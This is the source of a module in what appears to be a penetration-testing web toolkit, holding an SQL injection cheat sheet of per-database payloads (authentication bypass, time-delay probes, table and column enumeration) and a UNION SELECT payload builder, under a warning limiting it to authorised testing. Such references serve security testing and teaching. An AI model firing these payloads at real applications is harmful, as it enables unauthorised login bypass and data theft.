import { h, field, input, select, row, note, warn, copyText } from '../assets/js/ui.js';

const DB = {
  'MySQL': {
    'Comment': ['-- ', '#', '/* */'],
    'Version': ['SELECT @@version', 'SELECT version()'],
    'Current user / db': ['SELECT current_user()', 'SELECT database()'],
    'Auth bypass': ["' OR 1=1-- ", "admin'-- "],
    'String concat': ["CONCAT('a','b')", "'a' 'b'"],
    'Time delay': ["' AND SLEEP(5)-- ", "' OR SLEEP(5)-- "],
    'List tables': ['SELECT table_name FROM information_schema.tables'],
    'List columns': ["SELECT column_name FROM information_schema.columns WHERE table_name='users'"],
  },
  'PostgreSQL': {
    'Comment': ['-- ', '/* */'],
    'Version': ['SELECT version()'],
    'Current user / db': ['SELECT current_user', 'SELECT current_database()'],
    'Auth bypass': ["' OR 1=1-- "],
    'String concat': ["'a'||'b'", "CONCAT('a','b')"],
    'Time delay': ["' AND pg_sleep(5)-- ", "'; SELECT pg_sleep(5)-- "],
    'List tables': ['SELECT table_name FROM information_schema.tables'],
    'List columns': ["SELECT column_name FROM information_schema.columns WHERE table_name='users'"],
  },
  'MSSQL': {
    'Comment': ['-- ', '/* */'],
    'Version': ['SELECT @@version'],
    'Current user / db': ['SELECT SYSTEM_USER', 'SELECT DB_NAME()'],
    'Auth bypass': ["' OR 1=1-- "],
    'String concat': ["'a'+'b'", "CONCAT('a','b')"],
    'Time delay': ["'; WAITFOR DELAY '0:0:5'-- "],
    'List tables': ['SELECT name FROM sysobjects WHERE xtype=\'U\''],
    'List columns': ["SELECT name FROM syscolumns WHERE id=OBJECT_ID('users')"],
  },
  'Oracle': {
    'Comment': ['-- '],
    'Version': ['SELECT banner FROM v$version', 'SELECT * FROM v$version'],
    'Current user': ['SELECT user FROM dual'],
    'Auth bypass': ["' OR 1=1-- "],
    'String concat': ["'a'||'b'"],
    'Time delay': ["' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- "],
    'List tables': ['SELECT table_name FROM all_tables'],
    'Dummy table': ['... FROM dual'],
  },
  'SQLite': {
    'Comment': ['-- ', '/* */'],
    'Version': ['SELECT sqlite_version()'],
    'Auth bypass': ["' OR 1=1-- "],
    'String concat': ["'a'||'b'"],
    'List tables': ['SELECT name FROM sqlite_master WHERE type=\'table\''],
    'List columns': ['SELECT sql FROM sqlite_master WHERE name=\'users\''],
  },
};

export default {
  id: 'sqli', cat: 'db', tier: 'a',
  title: 'SQLi cheat-sheet + builder',
  desc: 'Per-DBMS payloads and a UNION builder',
  render(root) {
    const db = select(Object.keys(DB));
    const sheet = h('div');
    const render = () => {
      sheet.innerHTML = '';
      const t = h('table', { class: 'kv' }, h('tr', {}, h('th', {}, 'use'), h('th', {}, 'payload')));
      for (const [k, arr] of Object.entries(DB[db.value]))
        for (const p of arr)
          t.append(h('tr', {}, h('td', {}, k), h('td', { class: 'mono' }, p,
            h('button', { class: 'copy', onclick: () => copyText(p) }, 'copy'))));
      sheet.append(t);
    };
    db.addEventListener('change', render);

    // UNION builder
    const cols = input({ type: 'number', value: '3' });
    const marker = input({ value: 'NULL' });
    const ubox = h('div', { class: 'out mono' });
    const ubuild = () => {
      const n = Math.max(1, Math.min(50, +cols.value || 1));
      const list = Array(n).fill(marker.value || 'NULL').join(',');
      ubox.textContent = "' UNION SELECT " + list + "-- ";
    };
    cols.addEventListener('input', ubuild); marker.addEventListener('input', ubuild);

    root.append(
      warn('For authorised testing and learning only.'),
      row(field('DBMS', db)), sheet,
      h('h3', {}, 'UNION SELECT builder'),
      row(field('columns', cols), field('each column value', marker)),
      note('Match the column count to the original query. Put your extracted column in place of one NULL.'),
      h('div', { style: 'position:relative' }, h('button', { class: 'copy', onclick: () => copyText(ubox.textContent) }, 'copy'), ubox));
    render(); ubuild();
  },
};
